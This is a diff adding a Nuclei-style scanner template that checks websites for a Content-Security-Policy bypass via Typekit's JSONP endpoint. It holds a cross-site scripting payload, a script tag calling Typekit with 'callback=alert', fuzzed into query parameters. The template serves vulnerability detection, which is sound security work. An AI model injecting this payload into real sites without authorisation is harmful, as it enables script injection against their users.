@@ -1,0 +1,55 @@
+id: typekit-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Typekit
+  author: Jaenact
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,typekit
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "typekit.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: typekit_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://typekit.com/api/v1/json/libraries/full?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "typekit_csp_xss == true"
+# digest: 4a0a00473045022073b9b2525868180a4c9b85d4a620a675b86fbdd8f719b6a982cf2c5fc964a18d022100a999776acc63b065c1dc086a9e0b8a8cca736fe003c69552aafb0a36a0a50531:922c64590222798bb761d5b6d8e72950
